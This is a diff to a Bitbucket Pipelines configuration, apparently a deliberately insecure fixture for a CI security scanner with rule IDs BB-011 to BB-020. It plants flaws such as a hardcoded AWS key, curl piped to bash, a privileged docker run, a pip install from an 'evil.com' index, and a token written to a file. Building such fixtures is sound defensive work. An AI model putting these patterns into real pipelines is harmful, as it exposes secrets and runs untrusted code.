@@ -18,9 +18,11 @@ pipelines:
           - dist/**
 
     # BB-004 — deploy step missing `deployment:` env gate.
+    # BB-011 — inline long-lived AWS key in script.
     - step:
         name: Deploy to production
         script:
+          - export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
           - pipe: atlassian/aws-s3-deploy:1
             variables:
               AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID
@@ -34,3 +36,29 @@ pipelines:
         deployment: staging
         script:
           - ./dist/install.sh
+
+    # BB-012 — curl piped to shell.
+    # BB-013 — docker run --privileged.
+    # BB-014 — pip install from insecure source.
+    # BB-015 — no vulnerability scanning step.
+    # BB-016 — self-hosted runner without ephemeral marker.
+    # BB-017 — token written to file.
+    # BB-018 — cache key from attacker input.
+    # BB-019 — after-script references secrets.
+    - step:
+        name: Insecure setup
+        runs-on:
+          - self.hosted
+        caches:
+          - custom-$BITBUCKET_BRANCH
+        script:
+          - curl https://example.com/install.sh | bash
+          - docker run --privileged myimage
+          - pip install --index-url http://evil.com/simple/ pkg
+          - echo "$BITBUCKET_TOKEN" >> /tmp/token.txt
+        after-script:
+          - 'curl -H "Authorization: Bearer $BITBUCKET_TOKEN" https://api.example.com/notify'
+
+# BB-020 — full clone depth.
+clone:
+  depth: full
